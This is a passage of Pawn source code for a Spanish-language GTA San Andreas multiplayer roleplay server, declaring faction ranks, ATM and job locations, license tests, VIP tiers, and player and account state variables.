	{{"Práctico"}, {"Paramedico"}, {"Bombero"}, {"Supervisor General"}, {"Responsable Técnico"}, {"Director"}, {"Civil"}, {"Civil"}}, 
	{{"Ayudante"}, {"Trucker"}, {"Mecánico"}, {"Ingeniero"}, {"Supervisor"}, {"Director"}, {"Civil"}, {"Civil"}}, 
	{{"Medico"}, {"Bombero"}, {"Oficial"}, {"Sheriff"}, {"Mecanico"}, {"Gobernador"}, {"Civil"}, {"Civil"}},
	{{"Seguridad"}, {"Jefe de seguridad"}, {"Ministro"}, {"Alcalde LS"}, {"Vice-Presidente"}, {"Presidente"}, {"Civil"}, {"Civil"}}, 
	{{"Becario"}, {"Redactor"}, {"Periodista"}, {"Enviado Especial"}, {"Presentador"}, {"Director CNN"}, {"Civil"}, {"Civil"}}, 
	{{"Civil"}, {"Civil"}, {"Civil"}, {"Civil"}, {"Civil"}, {"Civil"}, {"Civil"}, {"Civil"}}, 
	{{"Agente"}, {"S. Agente"}, {"Especial"}, {"Criminalista"}, {"Sub-Director"}, {"Director"}, {"Civil"}, {"Civil"}}
};
//Sistema de cajero automatico  |--->
new static const textdOstring[][32] =
{
	{"Retirar"}, 
	{"Depositar"}, 
	{"Transferir"}, 
	{"Subsidio"}, 
	{"salir"}
};
//
enum _@en@cajeros
{
	cajeroObjeto, 
	Float:cajeroPos[6], 
	bool:cajeroUse, 
	Text:Textdcajero[11], 
	tranferenciaNombre[MAX_PLAYER_NAME]
};
new static cajeros[][_@en@cajeros] = 
{
	{2942, {1186.24927, -1373.82617, 13.15257, 0.00000, 0.00000, 91.33207}, false}, 
	{2942, {1295.86462, -991.40039, 38.02859, 0.00000, 0.00000, 271.05185}, false}, 
	{2942, {1295.81567, -994.04816, 38.02859, 0.00000, 0.00000, 271.05185}, false}, 
	{2942, {1295.71765, -996.41455, 38.02859, 0.00000, 0.00000, 269.01328}, false}, 
	{2942, {1700.12524, -1871.71667, 13.28720, 0.00000, 0.00000, 180.00000}, false}, 
	{2942, {2308.50537, -1637.40234, 14.44911, 0.00000, 0.00000, 269.43161}, false}, 
	{2942, {2404.17651, -1935.06189, 13.21154, 0.00000, 0.00000, 87.85944}, false}, 
	{2942, {2852.91650, -1498.01587, 10.40660, 0.00000, 0.00000, 179.09920}, false}, 
	{2942, {2184.70068, -1142.76257, 23.95786, 0.00000, 0.00000, 269.03708}, false}
};
//sistema de licencias |--->
enum _@en@obtenerLicencia
{
	cocheModelo, 
	Float:cochePos[4], 
	cocheWorld, 
	cocheInterior, 
	bool:cocheUse, 
	cocheExamen
};
new static obtenerLicencia[][_@en@obtenerLicencia] = 
{
	{410, {1414.3712, -39.1632, 1000.6524, 86.7709}, 90, 1, false}, 
	{410, {1414.3712, -39.1632, 1000.6524, 86.7709}, 91, 1, false}, 
	{410, {1414.3712, -39.1632, 1000.6524, 86.7709}, 92, 1, false}, 
	{410, {1414.3712, -39.1632, 1000.6524, 86.7709}, 93, 1, false}, 
	{586, {1414.3712, -39.1632, 1000.6524, 86.7709}, 94, 1, false}, 
	{586, {1414.3712, -39.1632, 1000.6524, 86.7709}, 95, 1, false}, 
	{586, {1414.3712, -39.1632, 1000.6524, 86.7709}, 96, 1, false}, 
	{586, {1414.3712, -39.1632, 1000.6524, 86.7709}, 97, 1, false}, 
	{593, {426.7948, 2501.7593, 16.9445, 88.0809}, 98, 0, false}, 
	{593, {426.7948, 2501.7593, 16.9445, 88.0809}, 99, 0, false}, 
	{473, {58.0547, -1221.8842, -0.5517, 324.8833}, 100, 0, false}, 
	{473, {58.0547, -1221.8842, -0.5517, 324.8833}, 101, 0, false}
};
//sistema de trabajos |--->
enum _@en@trabajos
{
	Float:trabPos[3], 
	trabNombre[32], 
	trabCmds[64], 
	trabNivel, 
	trabHoras, 
	trabSkin, 
	trabLic    /*1.-Moto 2.-Auto 3.-Avion 4.-Bote 5.-Armas 0.-Nada*/
};
new static trabajos[][_@en@trabajos] =  
{
	{{4000.0, 0.0, 0.0}, "Desempleado", 0, 0, 0}, 
	{{1278.4047, -979.6494, 38.3699}, "Transportador de Valores", "/servicio /finservicio /transportar", 3, 1, 164, 2}, 
	{{1956.7324, -2183.4846, 13.5469}, "Aviador", "/servicio /finservicio /pilotear", 4, 1, 61, 3}, 
	{{2205.6633, -2667.1572, 14.8642}, "Camionero", "/servicio /finservicio /cargar", 1, 1, 6, 2}, 
	{{2481.8337, -1536.7006, 24.0952}, "Barrendero", "/servicio /finservicio /limpiarcalle", 1, 1, 8, 2}, 
	{{1156.9833, -1770.1492, 16.5938}, "Conductor de Bus", "/servicio /finservicio /recorrido", 1, 1, 253, 2}, 
	{{-382.4231, -1438.8834, 25.7266}, "Agricultor", "/servicio /finservicio /cosechar", 1, 1, 158, 2}, 
	{{2102.3757, -1809.8839, 13.5547}, "Pizzero", "/servicio /finservicio /pizza", 1, 1, 155, 1}, 
	{{1685.7495, -1944.5226, 13.5469}, "Conductor de Trenes", "/servicio /finservicio /ruta", 2, 1, 261, 2}, 
	{{1766.1532, -1903.4260, 13.5665}, "Taxista", "/servicio /finservicio /tarifa", 4, 1, 7, 2}, 
	{{2190.5740, -1997.0985, 13.5469}, "Basurero", "/servicio /finservicio /basura", 1, 1, 6, 2}, 
	{{60.2410, -1720.7347, 7.5172}, "Pescador", "/servicio /finservicio /pescar", 2, 1, 128, 4}, 
	{{2530.5439, -880.4722, 87.6618}, "Minero", "/servicio /finservicio", 3, 1, 27, 0}, 
	{{2170.7991, -1736.3546, 13.5919}, "Carpintero", "/servicio /finservicio", 3, 1, 1, 0}, 
	{{1266.1512, -1259.9255, 13.1965}, "Obrero", "/servicio /finservicio", 2, 1, 260, 0}, 
	{{2609.1614, -2192.2715, -0.2188}, "Ladron", "/robar /vender", 5, 1, 0, 0}
};
//transportador de valores
new transCoches[3];
enum _@en@trabTransportador
{
	Float:transPos[3], 
	transLugar[24], 
	transPaga
}
new static trabTransportador[][_@en@trabTransportador] = 
{
	{{1324.9205, -1020.4911, 30.5684}, "Banco Los Santos", 0}, //Posicion de descarga.
	{{1361.1056, -1279.5759, 13.1084}, "Ammunation", 75}, 
	{{641.2266, -1358.4257, 13.1411}, "CNN", 167}, 
	{{538.2512, -1284.9053, 16.9693}, "Grotti", 245}, 
	{{1825.4022, -1684.7849, 13.1099}, "Alhambra", 350}, 
	{{1933.4580, -1777.9232, 13.1099}, "24-7 Idlewood", 370}, 
	{{2221.0288, -1714.4781, 13.0788}, "Gimnasio Ganton", 420}, 
	{{2252.5122, -1662.4115, 15.0982}, "Binco Ganton", 410}, 
	{{2223.2930, -1157.1451, 25.4822}, "Hotel Jefferson", 230}
};
//Aviador
new aviadorCoches[3];
enum _@en@trabAviador
{
	Float:aviPos[3], 
	aviLugar[24], 
	aviPaga
}
new static trabAviador[][_@en@trabAviador] = 
{
	{{1757.0514, -2494.2644, 14.0136}, "Aeropuerto Los Santos", 0}, //Posicion de descarga.
	{{1477.2335, 1554.3196, 11.2709}, "Aeropuerto Las Ventura", 750}, 
	{{203.4269, 2504.8892, 16.9481}, "Aeropuerto Abandonado", 850}, 
	{{-1461.8287, 30.4893, 14.6016}, "Aeropuerto San Fierro", 800}
};
//Camionero
new camioneroCoches[8];
enum _@en@trabCamionero
{
	Float:camPos[3], 
	camLugar[64], 
	camPaga, 
	camArma, 
	camDroga
}
new static trabCamionero[][_@en@trabCamionero] = 
{
	{{2195.2854, -2659.9751, 13.6404}, "Central de Camioneros", 0, 0, 0}, 
	{{1930.6619, -2105.1597, 13.3022}, "Dildos y ropa erotica Sex Shop", 80, 0, 0}, 
	{{1923.9396, -1791.7094, 13.1099}, "Bebidas 24-7 Idlewood", 180, 0, 0}, 
	{{1826.4622, -1682.4236, 13.1887}, "Productos Alhambra", 250, 0, 0}, 
	{{1534.4846, -1612.2167, 13.1891}, "Uniformes Comisaria", 310, 0, 0}, 
	{{1361.7355, -1279.9271, 13.1889}, "Chalecos y Porras Ammunation", 350, 0, 0}, 
	{{1191.1016, -1330.4587, 13.2075}, "Medicamentos Hospital", 365, 0, 0}, 
	{{763.6075, -1324.5220, 13.1931}, "Microfonos y parlantes CNN", 380, 0, 0}, 
	{{-63.9782, -1163.8698, 1.4974}, "Drogas Ilegales", 280, 0, 1}, 
	{{957.5847, -1195.5867, 16.7029}, "Armas Ilegales", 300, 1, 0}
};
//Barrendero
new	barrenderoCoches[5];
enum _@en@trabBarrendero
{
	Float:barrPos[3], 
	barrLugar[64], 
	barrPaga
}
new static trabBarrendero[][_@en@trabBarrendero] = 
{
	{{2478.3291, -1519.8127, 23.7194}, "Centro de Barrenderos", 0}, 
	{{2076.8308, -1088.9484, 24.5748}, "Ruta Norte", 250}, 
	{{1055.1868, -1316.5010, 13.1099}, "Ruta Oeste", 360}, 
	{{1886.7308, -2169.5405, 13.1099}, "Ruta Sur", 310}, 
	{{2764.8308, -1997.9698, 13.0938}, "Ruta Este", 210}
};
//Conductor de Bus
new	busesCoches[4];
enum _@en@trabBuses
{
	Float:busPos[3], 
	busLugar[64], 
	busPaga
}
new static trabBuses[][_@en@trabBuses] = 
{
	{{1181.4487, -1813.5980, 13.5042}, "Terminal de Buses", 0}, 
	{{1132.3799, -1709.2056, 13.6361}, "Ruta Norte", 650}, 
	{{1132.3799, -1709.2056, 13.6361}, "Ruta Oeste", 490}, 
	{{1228.1683, -1715.0996, 13.4828}, "Ruta Este", 560}
};
//Agricultor
new agricultorCoches[6];
enum _@en@trabAgricultor
{
	Float:agriPos[3], 
	agriPaga
}
new static trabAgricultor[][_@en@trabAgricultor] = 
{
	{{-319.9849, -1375.8418, 10.635}}, 
	{{-269.6147, -1347.6968, 7.5745}}, 
	{{-187.8086, -1346.2888, 4.6794}}, 
	{{-208.5391, -1403.7897, 5.9922}}, 
	{{-218.8421, -1476.9718, 7.3655}}, 
	{{-227.4934, -1507.8212, 7.2670}}, 
	{{-255.9632, -1533.2711, 5.3084}}, 
	{{-288.5627, -1529.6251, 7.6443}}, 
	{{-320.2344, -1536.8206, 13.317}}, 
	{{-324.2047, -1497.7075, 13.148}}, 
	{{-278.6971, -1486.9028, 5.4236}}, 
	{{-272.1083, -1425.9601, 10.552}}, 
	{{-371.5999, -1327.2524, 24.132}}, 
	{{-398.8338, -1309.0385, 28.440}}, 
	{{-435.8546, -1317.2576, 32.584}}, 
	{{-473.6981, -1315.2168, 31.212}}, 
	{{-497.4289, -1315.9136, 28.955}}, 
	{{-547.3321, -1308.3723, 21.356}}, 
	{{-566.4207, -1326.7592, 22.067}}, 
	{{-551.2082, -1367.1523, 17.886}}, 
	{{-515.8087, -1386.8441, 15.907}}, 
	{{-482.7648, -1376.1171, 23.531}}, 
	{{-442.2632, -1384.2202, 24.250}}, 
	{{-394.9627, -1376.3330, 23.550}}, 
	{{-371.8348, -1346.4370, 22.513}}, 
	{{-301.2910, -1346.4753, 7.9467}}, 
	{{-264.7333, -1377.3429, 10.180}}, 
	{{-231.6204, -1406.1943, 7.8591}}
};
//Pizzero
new pizzaCoches[7];
//Conductor de trenes
new tren;
//Taxista
new taxiCoches[8];
//Basurero
new basureroCoches[4];
enum _@en@trabBasurero
{
	Float:basPos[3], 
	Float:basPosOb[6], 
	basOmodel, 
	basObjeto
}
new static trabBasurero[][_@en@trabBasurero] =
{
	{{1018.4075, -779.1424, 103.0904}, {1015.22211, -776.84167, 102.30627, 0.00000, 0.00000, 5.57342}, 1236}, 
	{{924.5161, -831.7798, 94.5947}, {922.06067, -830.32825, 93.53995, 0.00000, 0.00000, 29.64116}, 1236}, 
	{{808.5920, -878.2778, 62.8287}, {804.88580, -876.40277, 60.64260, 0.00000, -9.00000, 34.59811}, 1236}, 
	{{710.3611, -1009.1459, 52.7140}, {712.27698, -1011.43781, 51.89606, 0.00000, 0.00000, 240.03586}, 1236}, 
	{{669.9243, -1058.4303, 49.8972}, {667.74194, -1057.44861, 48.88351, 0.00000, 0.00000, 54.92595}, 1236}, 
	{{563.3491, -1191.5549, 45.2446}, {561.94592, -1195.74512, 44.31861, 0.00000, 0.00000, 19.58215}, 1236}, 
	{{419.6595, -1243.4911, 51.5938}, {421.15112, -1246.50244, 50.87219, 0.00000, 0.00000, 20.88674}, 1236}, 
	{{254.0467, -1333.4885, 53.3321}, {254.89285, -1336.16577, 52.50151, 0.00000, 0.00000, 37.03472}, 1236}, 
	{{335.7516, -1194.4197, 76.8528}, {338.46573, -1195.65125, 76.19203, 0.00000, 0.00000, 36.35602}, 1236}, 
	{{926.3409, -668.1408, 119.2681}, {925.22589, -665.77747, 118.12727, 0.00000, 0.00000, 51.67481}, 1236}, 
	{{995.4542, -640.2104, 121.7222}, {997.06384, -643.14398, 120.94318, 0.00000, 0.00000, 25.00474}, 1236}, 
	{{1269.2377, -613.8710, 103.7038}, {1273.15283, -615.96686, 102.80786, 0.00000, 0.00000, 28.84564}, 1236}
};
//Pescador
new pescadorCoches[4];
enum _@en@trabPescador
{
	Float:pesPos[3]
}
new static trabPescador[][_@en@trabPescador] =
{
	{{-0.2696, -1694.5732, -0.6348}}, 
	{{538.0734, -2526.5903, -1.0098}}, 
	{{756.8614, -2496.9202, -0.9916}}, 
	{{891.5204, -2694.9390, -0.7306}}, 
	{{743.0330, -2724.0449, -0.3342}}, 
	{{532.7263, -2808.8711, -0.5250}}, 
	{{329.1474, -2818.3220, -0.3335}}, 
	{{125.8899, -2899.1643, -0.6681}}, 
	{{224.0869, -3083.9644, -1.1578}}, 
	{{442.0750, -3039.6270, -0.0163}}, 
	{{546.4991, -2756.2024, -0.9055}}, 
	{{573.7264, -2585.0481, -0.6371}}, 
	{{484.4695, -2444.2292, -0.4460}}, 
	{{350.8412, -2358.2095, -0.7533}}, 
	{{111.1102, -2242.4360, -0.5017}}, 
	{{-19.7385, -2095.8950, -0.7636}}
};
//Minero
enum _@en@trabMinero
{
	Float:minPos[3]
}
new static trabMinero[][_@en@trabMinero] =
{
	{{2559.6528, -875.9788, 43.9726}}, //DENTRO DE LA MINA
	{{2553.7097, -876.1094, 88.6428}}, //FUERA DE LA MINA
	{{2557.3345, -870.4352, 44.1111}}, //Llevar el mineral
	{{2579.6082, -864.2158, 45.2071}}, 
	{{2583.9187, -865.5084, 47.4194}}, 
	{{2584.2122, -870.5911, 46.2060}}, 
	{{2586.4280, -876.6500, 47.8199}}, 
	{{2581.8962, -878.7319, 45.4436}}, 
	{{2582.9602, -884.4443, 47.7654}}, 
	{{2576.4402, -884.2696, 46.1994}}
};
//Carpintero
enum _@en@trabCarpintero
{
	Float:carPos[3]
}
new static trabCarpintero[][_@en@trabCarpintero] =
{
	{{2159.6399, -1735.3275, 13.7229}}, //llevar mueble
	{{2166.3882, -1732.5349, 13.6359}}, 
	{{2170.3508, -1732.3679, 13.6359}}, 
	{{2170.2769, -1730.1085, 13.6359}}, 
	{{2166.3423, -1730.1299, 13.6359}}, 
	{{2166.4229, -1727.8405, 13.6359}}, 
	{{2170.4375, -1727.7645, 13.6359}}
};
//Obrero
enum _@en@trabObrero
{
	Float:obrPos[3]
}
new static trabObrero[][_@en@trabObrero] =
{
	{{0.0, 0.0, 0.0}}, //vacio
	{{1325.9763, -1271.9106, 18.6912}}, 
	{{1320.2340, -1271.2960, 18.6908}}, 
	{{1311.4320, -1271.2819, 18.6908}}, 
	{{1302.5316, -1271.4728, 18.6909}}, 
	{{1290.1667, -1271.4619, 19.1310}}, 
	{{1277.5302, -1243.0900, 14.5475}}, 
	{{1256.2655, -1248.6604, 15.0811}}, 
	{{1247.9127, -1239.5580, 17.3285}}
};
//sistema de Bolsa |--->
enum _@en@acciones
{
	aAccTipo[8], 
	aAccCantidad[8]
}
new static acciones[MAX_PLAYERS][_@en@acciones];
//sistema de VIP |--->
enum _@en@premiums
{
	vipNivel, 
	vipCosto, 
	vipTiempo, 
	vipNombre[24]
}
new const premiums[][_@en@premiums] =
{
	{1, 1000, 1296000, "Premium Silver"}, //silver 
	{1, 2000, 2592000, "Premium Silver"}, 
	{1, 3600, 5184000, "Premium Silver"}, 
	{2, 1400, 1296000, "Premium Gold"}, //gold
	{2, 3300, 2592000, "Premium Gold"}, 
	{2, 5200, 5184000, "Premium Gold"}, 
	{3, 1800, 1296000, "Premium Titanium"}, //titanium
	{3, 3600, 2592000, "Premium Titanium"}, 
	{3, 5800, 5184000, "Premium Titanium"}, 
	{4, 5000, 1296000, "Premium ZZ Fans"}, //zz fans
	{4, 9000, 2592000, "Premium ZZ Fans"}, 
	{4, 16000, 5184000, "Premium ZZ Fans"}
};

new ReduceTimeb                                                                 [MAX_PLAYERS];
new AntiFloodCommand															[MAX_PLAYERS][2];
new tCambioPagina																[MAX_PLAYERS];
new DniValores																	[MAX_PLAYERS][2];
new DriveBy																		[MAX_PLAYERS];
new	Att_Obj_Slot_0																[MAX_PLAYERS][20];
new Att_Obj_Slot_1																[MAX_PLAYERS][20];
new Att_Obj_Slot_2																[MAX_PLAYERS][20];
new Att_Obj_Slot_3																[MAX_PLAYERS][20];
new Att_Obj_Slot_4																[MAX_PLAYERS][20];
new TimeAFK																		[MAX_PLAYERS];
new AFKCount																	[MAX_PLAYERS];
new WooferSet																	[MAX_PLAYERS];
new Puertas																		[MAX_PLAYERS];
new Advertencia_Debe															[MAX_PLAYERS];
new Hotdog																		[MAX_PLAYERS];
new curentg																		[MAX_PLAYERS];
new Bar:bHambre																	[MAX_PLAYERS];
new ClothesID																	[MAX_PLAYERS];
new ClothesPrice																[MAX_PLAYERS];
new TEL_INPUT_ID																[MAX_PLAYERS];
new TEL_NUMBER																	[MAX_PLAYERS];
new Skate																		[MAX_PLAYERS];
new BuyNarco																	[MAX_PLAYERS];
new NarcoSellPrice																[MAX_PLAYERS];
new NarcoSellArm																[MAX_PLAYERS];
new NarcoSellAmmo																[MAX_PLAYERS];
new QuitExtortion																[MAX_PLAYERS];
new ExtortionID																	[MAX_PLAYERS];
new Blinded																		[MAX_PLAYERS];
new Tied																		[MAX_PLAYERS];
new Rope																		[MAX_PLAYERS];
new Matrimonio																	[MAX_PLAYERS];
new Divorciar																	[MAX_PLAYERS];
new Fichas																		[MAX_PLAYERS];
new Speaker																		[MAX_PLAYERS];
new AdminChat																	[MAX_PLAYERS];
new HireKey																		[MAX_PLAYERS];
new HireKeyTime																	[MAX_PLAYERS];
new DrugFarming																	[MAX_PLAYERS];
new Intentar																	[MAX_PLAYERS];
new PaintPvcAsesinatos															[MAX_PLAYERS];

new peticiones																	[MAX_PLAYERS];
new peticionSlotItem																	[MAX_PLAYERS];
new Text3D:Estado																[MAX_PLAYERS];
new EstadoON																	[MAX_PLAYERS];
new NumBuy																		[MAX_PLAYERS];
new NumSeller																	[MAX_PLAYERS];
new NumPrice																	[MAX_PLAYERS];
new RecNumber																	[MAX_PLAYERS];
new ActiveTeleport																[MAX_PLAYERS];
new slotselection																[MAX_PLAYERS];
new DrugTimer																	[MAX_PLAYERS];
new See_MP																		[MAX_PLAYERS];
new PFrecuencia																	[MAX_PLAYERS];
new CanalIRC																	[MAX_PLAYERS];
new UsedFind																	[MAX_PLAYERS];
new WhoFind																		[MAX_PLAYERS];
new ReqF_Faction																[MAX_PLAYERS];
new ReqF_Name																	[MAX_PLAYERS][32];
new Freezed																		[MAX_PLAYERS];
new Mostrar																		[MAX_PLAYERS]; 
new Accesory																	[MAX_PLAYERS];
new InAmbu																		[MAX_PLAYERS];
new Bowling																		[MAX_PLAYERS];
new BowlingMoney																[MAX_PLAYERS];
new Revisado																	[MAX_PLAYERS];
new Float:TeleportDest															[MAX_PLAYERS][3];
new Float:InceptionPos															[MAX_PLAYERS][3];
new JustDied																	[MAX_PLAYERS];
new KnockedDown																	[MAX_PLAYERS];
new UsingDrugs																	[MAX_PLAYERS];
new peticionIDofertante															[MAX_PLAYERS];
new peticionIDItem																[MAX_PLAYERS];
new peticionPrecio																[MAX_PLAYERS];
new SelectClick																	[MAX_PLAYERS];
new CambioPagina																[MAX_PLAYERS];

new PrisionRejas[4];

enum _@en@booleano
{
	RadioOn, 
	gMensajesP, 
	jObjetivo, 
	OnDuty, 
	TextShow, 
	ConEstado, 
	CallGiveWeapon, 
	_ComprandoCoche, 
	_ComprandoDNI, 
	_EstadoIphone, 
	iConnect, 
	PhoneOnline, 
	HidePM, 
	BigEar, 
	gFam, 
	gNews, 
	gOoc, 
	gCinturon, 
	gIngreso, 
	TalkingLive, 
	Tazer, 
	PlayerTazeado, 
	PlayerCuffed, 
	Ganzuas, 
	NoFuel, 
	AntiAbusos, 
	AdminDuty, 
	gMurio, 
	NewUsed, 
	Facturing, 
	MsgL4L, 
	Rescued, 
	MensajeMuriendo, 
	Regalo_Offer, 
	FamiliaOficialOn, 
	duda, 
	ReduceTime, 
	ComproCine, 
	ComcRobooleto, 
	PlayerSol, 
	PlayerDuda, 
	UsingRayBan, 
	PickLock, 
	PlayerNeedsHelp, 
	DestruirTexto, 
	Transplante, 
	TienePeriodico, 
	PPersona, 
	npcUse
}
new bool:booleano[_@en@booleano][MAX_PLAYERS char];//Variables Tipos Boleanas
new cNicotina																	[MAX_PLAYERS];
new cEnergysil																	[MAX_PLAYERS];
new cSIDA																		[MAX_PLAYERS];
new cCancer																		[MAX_PLAYERS];
new cEpilepsia																	[MAX_PLAYERS];
new MarihuanaBeat																[MAX_PLAYERS];
new YaAposto																	[MAX_PLAYERS];
new Maskuse																		[MAX_PLAYERS];
new EctasyEffect																[MAX_PLAYERS];
new RitalinEffect																[MAX_PLAYERS];
new HeroinaEffect																[MAX_PLAYERS];
new HeroinaBeat																	[MAX_PLAYERS];
new MarihuanaEffect																[MAX_PLAYERS];

enum _@en@enteroChar{
	dComida, 
	nPagarContador, 
	nPublicidad, 
	visual, 
	cajeroslot, 
	lictipo, 
	licslot, 
	licestado, 
	licvueltas, 
	rejaPasos, 
	rejaID, 
	antiBH, 
	cPrueba, 
	gCSpawn, 
	gAnden, 
	antiCbug
}
new enteroChar[_@en@enteroChar][MAX_PLAYERS char];

//anti-cheats
static detectarArmas[MAX_PLAYERS][13][3];
static detectarArmas2[MAX_PLAYERS][13][2];

enum _@en@entero
{
	lictiempo, 
	sNegocio, 
	sbebidas, 
	borracho, 
	PPobjeto, 
	opid[50], 
	opid2, 
	opid3[50], 
	eActId, 
	antiBHtime, 
	gSpectea
}
new static entero[MAX_PLAYERS][_@en@entero];

//Variables a Optimizar
new Color																		[MAX_PLAYERS];
new HouseExplo																	[MAX_PLAYERS];
new PlayerStatInfo																[MAX_PLAYERS][8][32]; 
new DNIName																		[MAX_PLAYERS][32];
new UsingEctasy																	[MAX_PLAYERS];
new UsingRitalin																[MAX_PLAYERS];
new UsingHeroina																[MAX_PLAYERS];
new UsingMarihuana																[MAX_PLAYERS];
new JustReported																[MAX_PLAYERS];
new Mochila																		[MAX_PLAYERS][2];
new SmokeTimer																	[MAX_PLAYERS];
new IsSmoking																	[MAX_PLAYERS];
new Saludo_ID																	[MAX_PLAYERS];
new Regalo_ID																	[MAX_PLAYERS];
new Regalo_ITEM																	[MAX_PLAYERS];
new Left4Life																	[MAX_PLAYERS];
new TicketOffer																	[MAX_PLAYERS]; 
new TicketMoney																	[MAX_PLAYERS];
new PlayerText:PuntosDeRolTextdraw0												[MAX_PLAYERS];
new PlayerText:InfoText															[MAX_PLAYERS][15];
new InfoTimer																	[MAX_PLAYERS];
new Situacion																	[MAX_PLAYERS];
new LiveOffer																	[MAX_PLAYERS];
new Condom																		[MAX_PLAYERS]; 
new CellTime																	[MAX_PLAYERS];
new CallCost																	[MAX_PLAYERS];
new Guardes_Oferta																[MAX_PLAYERS];
new Guardes_Precio																[MAX_PLAYERS];
new Reparar_Precio																[MAX_PLAYERS];
new Reparar_Oferta																[MAX_PLAYERS];
new ProhibirPM																	[MAX_PLAYERS];
new Text3D:estado																[MAX_PLAYERS];
new Text:Presentacion[5];
new Text:TextdrawGlobal[2];
new Text:TextdBan[3];

new Mobile[1000];
/******************************************************************************/
/************************[- Enums - Enumeradores -]****************************/
/******************************************************************************/
enum WoInfo
{
    Float:WoPosX, 
	Float:WoPosY, 
	Float:WoPosZ, 
	WoInterior, 
	WoVW, 
	WoEstacion, 
	WoSetby, 
	WoObjeto, 
};

enum _@en@cuenta
{
	//Guarda estas variables.
	cUnico, 
	cAcceso[24], 
	cAcceso2[24], 
	cNivel, 
    cEmpleado, 
	cAdministrador, 
	cZonaZeroCash, 
	cHorasJugadas, 
	cAcento, 
	cRegistro, 
	cSexo, 
	cEdad, 
	cOrigen, 
	cCaminar, 
	cCobro, 
	cEstereo, 
	cExperiencia, 
	cDinero, 
	cDineroBanco, 
	cCheques, 
	cAsesinatos, 
	cMuerte, 
	cArrestado, 
	cLoteria, 
	cTrabajo, 
	cCarcel, 
	cTiempoCarcel, 
	cMateriales, 
	cDrogas, 
	cSpeed, 
	cExtasis, 
	cRitalin, 
	cHeroina, 
	cMarihuana, 
	cLider, 
	cMiembro, 
	cRango, 
	cTraje, 
	Float:cVida, 
	Float:cArmadura, 
	cInterior, 
	cMundo, 
	cEquipo, 
	cTelefono, 
	cSaldo, 
	cMinutos, 
	cHoras, 
	cMensajes, 
	cIpod, 
	cCoche, 
	cCoche2, 
 	cCoche3, 
 	cCoche4, 
	cCasa, 
	cCasa2, 
	cNegocio, 
	cNegocio2, 
	Float:cPosiciones[3], 
	cLicenciaAuto, 
	cLicenciaMoto, 
	cLicenciaVuelo, 
	cLicenciaBote, 
	cLicenciaArma, 
	cGafas, 
	cTutorial, 
	cAntecedente1[64], 
	cAntecedente2[64], 
	cAntecedente3[64], 
	cNote1[80], 
	cNote2[80], 
	cNote3[80], 
	cNote4[80], 
	cNote5[80], 
	cSMS1[80], 
	cSMS2[80], 
	cSMS3[80], 
	cSMS4[80], 
	cSMS5[80], 
	cEncendedor, 
	cCigarrillos, 
	cMascara, 
	cAdvertencias, 
    cAdminAdvertencia, 
	cIdentificacion, 
	cArma[12], 
	cMunicion[12], 
 	cMaleta, 
 	cMochila, 
 	cCasco, 
 	cWofer, 
	cFamilia, 
	cFamiliaRango, 
 	cDesert, 
 	cEscopeta, 
 	cMP5, 
 	cAK47, 
 	cM4, 
 	cSniper, 
 	cEstiloPelea, 
 	cLeccion, 
 	cBusqueda, 
 	cRentado, 
 	cRobo, 
 	cDonador, 
	cDonar[3], 
	cBanDuda, 
 	cSeguro, 
 	cWalkie, 
 	cCabeza, 
 	cCasado, 
 	cPareja[24], 
 	cEntrada, 
 	cPeces, 
 	cImplementos, 
	pagas, 
 	cSilenciado, 
 	cHambre, 
 	cEnfermedad, 
 	cEnfermedad2, 
 	cEnfermedad3, 
 	cCobrap, 
 	cPuntosRol, 
 	cTarjeta, 
 	cADVRol, 
    cPack, 
    cPackID, 
	cSkills[MAX_SKILLS_WORK], 
	cInv1[2], // cInv1[0] = Prueba de rol
	cAHoras, 
	cAMinutos, 
	cMonedas, 
	cSemillas[5], 
	cNavidad, 
	cCarcelAdmin[MAX_PLAYER_NAME], 
	cCarcelRazon[64], 
	//Posible variables borradas.
 	pSIDA, 
 	pCancer, 
 	pEpilepsia, 
 	pAntiSIDA, 
 	pAntiCancer, 
 	pAntiEpilepsia, 
 	cIdentificacionFalse, 
 	cIdentificacionName[32], 
 	pAnilloDia, 
 	pGaraje, 
	pHelper, 
	pScripter, 
	pTimeCar, 
	pTimeCar2, 
	pFlyLic, 
	pBoatLic, 
	pMSN[48], 
	pEstado[18], 
	//No guarda estas variables.
	bool:servicio, 
	selecciono, 
	selecciono2, 
	objetos[2], 
	temporiz
	
};
new cuenta[MAX_PLAYERS][_@en@cuenta];
new MaleteroObjetos[MAX_VEHICLES][8];
new floodinforme = 0;
new DefaultWeather = 10;

enum ArmaO{
	Float:Objeto_xyz[9], 
	Objeto_id[3], 
	Objeto_Info[4], 
	Text3D:LabelObject[3], 
	oWorld[3]
}
new ArmaObjeto[MAX_ARMAS][ArmaO];

new GunObjects[47][0] = { // [Objetos armas Borrar]
    {0}, // Emty
    {331}, // Brass Knuckles
    {333}, // Golf Club
	{334}, // Nitestick
    {335}, // Knife
    {336}, // Baseball Bat
    {337}, // Showel
    {338}, // Pool Cue
    {339}, // Katana
    {341}, // Chainsaw
    {321}, // Purple Dildo
    {322}, // Small White Dildo
    {323}, // Long White Dildo
    {324}, // Vibrator
    {325}, // Flowers
    {326}, // Cane
    {342}, // Grenade
    {343}, // Tear Gas
    {344}, // Molotov
    {0}, 
    {0}, 
    {0}, 
    {346}, // Glock
    {347}, // Silenced Colt
    {348}, // Desert Eagle
    {349}, // Shotgun
    {350}, // Sawn Off
    {351}, // Combat Shotgun
    {352}, // Micro UZI
    {353}, // MP5
    {355}, // AK47
    {356}, // M4
    {372}, // Tec9
    {357}, // Rifle
    {358}, // Sniper Rifle
    {0}, // Rocket Launcher
    {0}, 
    {361}, // Flamethrower
    {0}, 
    {363}, // Detonator
    {364}, // Detonator Button
    {365}, // Spraycan
    {366}, // Fire Extinguisher
    {367}, // Camera
    {0}, 
    {368}, // Infrared Vision
    {371}// Parachute
};

new CarName[212][] = {
	{"Landstalker"}, {"Bravura"}, {"Buffalo"}, {"Linerunner"}, {"Perrenial"}, {"Sentinel"}, 
	{"Dumper"}, {"Firetruck"}, {"Trashmaster"}, {"Stretch"}, {"Manana"}, {"Infernus"}, {"Voodoo"}, 
	{"Pony"}, {"Mule"}, {"Cheetah"}, {"Ambulance"}, {"Leviathan"}, {"Moonbeam"}, {"Esperanto"}, {"Taxi"}, 
	{"Washington"}, {"Bobcat"}, {"Mr. Whoopee"}, {"BF. Injection"}, {"Hunter"}, {"Premier"}, {"Enforcer"}, 
	{"Securicar"}, {"Banshee"}, {"Predator"}, {"Bus"}, {"Rhino"}, {"Barracks"}, {"Hotknife"}, {"Article Trailer"}, 
